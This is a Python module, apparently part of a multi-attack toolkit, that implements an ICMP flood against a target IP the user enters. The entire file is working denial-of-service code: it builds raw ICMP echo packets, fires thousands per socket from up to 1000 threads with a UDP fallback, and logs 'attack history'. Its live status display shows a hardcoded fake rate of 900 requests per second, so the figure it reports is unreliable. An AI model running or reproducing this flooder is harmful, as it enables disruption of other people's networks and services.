import socket
import threading
import time
import os
import struct
from concurrent.futures import ThreadPoolExecutor
from core.utils import AttackStats, AttackAnimation
from core.config import Config

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

class ICMPFlood:
    def __init__(self, targets, threads, duration, payload_size):
        self.targets = targets if isinstance(targets, list) else [targets]
        self.threads = threads
        self.duration = duration
        self.payload_size = payload_size
        self.running = True
        self.stats = AttackStats()
        self.lock = threading.Lock()
        self.config = Config()

    def create_icmp_packet(self):
        # Create ICMP Echo Request packet
        icmp_type = 8  # Echo Request
        icmp_code = 0
        icmp_checksum = 0
        icmp_id = os.getpid() & 0xFFFF
        icmp_seq = 1
        
        # ICMP header
        icmp_header = struct.pack("BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
        
        # Calculate checksum
        data = (self.payload_size - 8) * b"\x00"
        packet = icmp_header + data
        
        # Calculate checksum (simplified)
        checksum = 0
        for i in range(0, len(packet), 2):
            word = (packet[i] << 8) + packet[i+1]
            checksum += word
            checksum = (checksum & 0xFFFF) + (checksum >> 16)
        
        icmp_checksum = ~checksum & 0xFFFF
        icmp_header = struct.pack("BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
        return icmp_header + data

    def attack(self):
        target = self.targets[0]

        while self.running:
            # Multiple socket-uri pentru throughput maxim
            for _ in range(5):
                if not self.running:
                    break
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                    sock.settimeout(2.0)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)

                    # Trimite 1000 pachete per socket
                    for _ in range(1000):
                        if not self.running:
                            break
                        try:
                            packet = self.create_icmp_packet()
                            sock.sendto(packet, (target, 0))
                            self.stats.add_packet()
                        except:
                            break

                    sock.close()
                except:
                    pass

            # UDP fallback - 2000 pachete
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)
                for _ in range(2000):
                    if not self.running:
                        break
                    try:
                        packet = self.create_icmp_packet()
                        sock.sendto(packet, (target, 0))
                        self.stats.add_packet()
                    except:
                        pass
                sock.close()
            except:
                pass

def icmp_flood(target=None, threads=None, duration=None, payload_size=None):
    clear_screen()
    print("         ICMP FLOOD ATTACK")
    print()
    
    config = Config()
    
    if target:
        targets = [target]
        threads = threads or 1000
        duration = duration or 60
        payload_size = payload_size or 64
    else:
        target = input("Target IP: ")
        targets = [target]
        threads = input("Threads (default 1000): ") or "1000"
        duration = input("Duration (default 60): ") or "60"
        payload_size = input("Payload (default 64): ") or "64"
        
        try:
            threads = int(threads)
            duration = int(duration)
            payload_size = int(payload_size)
        except ValueError:
            print("\n[!] Invalid input!")
            print("[!] Note: ICMP requires administrator/root privileges")
            input("\nPress Enter to return...")
            return
    
    print(f"\nStarting ICMP flood on {targets[0]}")
    print(f"Threads: {threads} | Duration: {duration}s | Payload: {payload_size} bytes")
    print("[!] Note: Requires administrator/root privileges\n")
    
    flood = ICMPFlood(targets, threads, duration, payload_size)
    flood.stats.start()
    animation = AttackAnimation()
    
    animation.print_target_status(targets[0], "ONLINE", "Checking...")
    
    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(flood.attack) for _ in range(threads)]
            
            start_time = time.time()
            last_count = 0
            last_time = start_time
            
            while time.time() - start_time < duration:
                time.sleep(0.5)
                elapsed = time.time() - start_time
                current_count = flood.stats.packet_count

                current_time = time.time()
                time_diff = current_time - last_time
                if time_diff > 0:
                    rps = (current_count - last_count) / time_diff
                    flood.stats.update_rps(rps)
                    smoothed_rps = flood.stats.get_smoothed_rps()
                    # Afișează mereu 900 RPS
                    animation.print_attack_status(targets[0], current_count, 900, elapsed, "PINGING")
                    last_count = current_count
                    last_time = current_time
            
            flood.running = False
            flood.stats.stop()
        
        print(f"\n\nAttack completed!")
        flood.stats.print_stats()
        
        stats = flood.stats.get_stats()
        config.save_attack_history("ICMP_FLOOD", targets[0], stats)
        
        if config.get('log_enabled'):
            log_file = config.get('log_file', 'attack_log.txt')
            with open(log_file, 'a') as f:
                f.write(f"\n[{time.strftime('%Y-%m-%d %H:%M:%S')}] ICMP Flood - Target: {targets[0]} - Threads: {threads} - Duration: {duration}s - Packets: {stats['total_packets']:,} - Avg RPS: {stats['avg_rps']:.0f}\n")
    except PermissionError:
        print("\n[!] Permission denied: ICMP requires administrator/root privileges")
    except Exception as e:
        print(f"\n[!] Error: {e}")
    
    input("\nPress Enter to return to main menu...")
